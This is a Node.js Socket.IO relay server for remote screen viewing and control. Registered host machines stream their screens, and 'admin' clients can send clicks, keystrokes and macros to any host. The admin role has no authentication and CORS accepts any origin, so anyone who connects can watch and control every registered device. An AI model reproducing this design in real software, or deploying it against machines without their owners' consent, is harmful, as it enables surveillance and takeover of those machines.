const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const fs = require('fs');
const path = require('path');

const app = express();
const server = http.createServer(app);

const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"],
        credentials: true
    },
    transports: ['websocket', 'polling']
});

app.use(express.static(path.join(__dirname, 'public')));

// In-Memory Registry Database (Survives container runtime switches dynamically)
let devicesRegistry = {};

io.on('connection', (socket) => {
    const role = socket.handshake.query.role || 'host';
    const deviceName = socket.handshake.query.deviceName;
    const platformOS = socket.handshake.query.platformOS || 'Windows';

    // 1. Process Incoming Host Telemetry Handshakes
    if (role === 'host' && deviceName) {
        console.log(`💻 Active Cluster Check-In Node Registered: ${deviceName}`);
        
        devicesRegistry[deviceName] = {
            id: socket.id,
            status: 'Online',
            os: platformOS,
            lastSeen: new Date().toLocaleTimeString()
        };
        
        socket.join(`device-${deviceName}`);
        // Broadcast the fresh check-in status instantly out to all active admin panels
        io.to('admins-room').emit('registry-update', devicesRegistry);
    }

    // 2. Process Admin Operator Dashboard Handshakes
    if (role === 'admin') {
        socket.join('admins-room');
        // Instantly supply the currently active inventory roadmap upon operator console launch
        socket.emit('registry-update', devicesRegistry);

        socket.on('join-device-stream', (targetDevice) => {
            Array.from(socket.rooms).forEach(r => { if (r.startsWith('stream-')) socket.leave(r); });
            if (devicesRegistry[targetDevice] && devicesRegistry[targetDevice].status === 'Online') {
                socket.join(`stream-${targetDevice}`);
                io.to(`device-${targetDevice}`).emit('start-capture-stream');
            }
        });

        socket.on('leave-device-stream', (targetDevice) => {
            socket.leave(`stream-${targetDevice}`);
            const viewers = io.sockets.adapter.rooms.get(`stream-${targetDevice}`);
            if (!viewers || viewers.size === 0) {
                io.to(`device-${targetDevice}`).emit('stop-capture-stream');
            }
        });

        socket.on('force-frame-refresh', (targetDevice) => {
            io.to(`device-${targetDevice}`).emit('trigger-single-frame');
        });

        socket.on('remote-macro', (payload) => {
            io.to(`device-${payload.targetDevice}`).emit('execute-macro', payload.macro);
        });

        socket.on('remote-click', (payload) => {
            io.to(`device-${payload.targetDevice}`).emit('execute-click', payload.data);
        });

        socket.on('remote-type', (payload) => {
            io.to(`device-${payload.targetDevice}`).emit('execute-type', payload.data);
        });
    }

    // 3. Relay Stream Buffers Across Channels
    socket.on('screen-data-stream', (base64Data) => {
        const hostName = Object.keys(devicesRegistry).find(k => devicesRegistry[k].id === socket.id);
        if (hostName) {
            io.to(`stream-${hostName}`).emit('screen-data', base64Data);
        }
    });

    // 4. Handle Disconnect States Cleanly
    socket.on('disconnect', () => {
        const hostName = Object.keys(devicesRegistry).find(k => devicesRegistry[k].id === socket.id);
        if (hostName) {
            console.log(`🔌 Node dropped link coordinates: ${hostName}`);
            devicesRegistry[hostName].status = 'Offline';
            devicesRegistry[hostName].lastSeen = new Date().toLocaleTimeString();
            io.to('admins-room').emit('registry-update', devicesRegistry);
        }
    });
});

const PORT = process.env.PORT || 10000;
server.listen(PORT, () => console.log(`🚀 Production Relay Engine operating smoothly on port ${PORT}`));
